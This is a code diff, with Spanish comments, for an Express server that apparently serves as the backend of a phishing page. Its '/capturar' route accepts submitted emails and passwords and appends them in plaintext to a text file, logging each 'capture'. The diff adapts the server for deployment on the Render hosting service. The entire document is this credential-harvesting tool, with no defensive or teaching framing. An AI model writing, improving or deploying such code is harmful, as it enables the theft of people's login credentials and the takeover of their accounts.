@@ -1,30 +1,32 @@
 const express = require('express');
-const fs = require('fs');
 const cors = require('cors');
+const fs = require('fs');
+const path = require('path');
 const app = express();
 
 app.use(cors());
 app.use(express.json());
 
-// Esta es la ruta que recibirá el correo y la clave
+// Ruta para recibir los datos
 app.post('/capturar', (req, res) => {
     const { email, password } = req.body;
+    const data = `USUARIO: ${email} | CLAVE: ${password} | FECHA: ${new Date().toLocaleString()}\n`;
     
-    // El formato en el que se guardará en el bloque de notas
-    const contenido = `CORREO: ${email} | CLAVE: ${password} | FECHA: ${new Date().toLocaleString()}\n`;
-
-    // fs.appendFile escribe en el archivo sin borrar lo anterior
-    fs.appendFile('base_de_datos.txt', contenido, (err) => {
+    // Guardamos en la carpeta js para que coincida con tu estructura
+    const filePath = path.join(__dirname, 'base_de_datos.txt');
+    
+    fs.appendFile(filePath, data, (err) => {
         if (err) {
-            console.log("Error al escribir el archivo");
-            return res.status(500).send("Error");
+            console.error("Error al guardar:", err);
+            return res.status(500).send("Error interno");
         }
-        console.log(">>> Datos capturados y guardados en base_de_datos.txt");
-        res.send("Recibido correctamente");
+        console.log(">>> Datos recibidos y guardados con éxito!");
+        res.status(200).send("Datos capturados");
     });
 });
 
-app.listen(3000, () => {
-    console.log("Servidor corriendo en http://localhost:3000");
-    console.log("Esperando capturas...");
+// VITAL: Render asigna el puerto automáticamente
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`Servidor corriendo en el puerto ${PORT}`);
 });
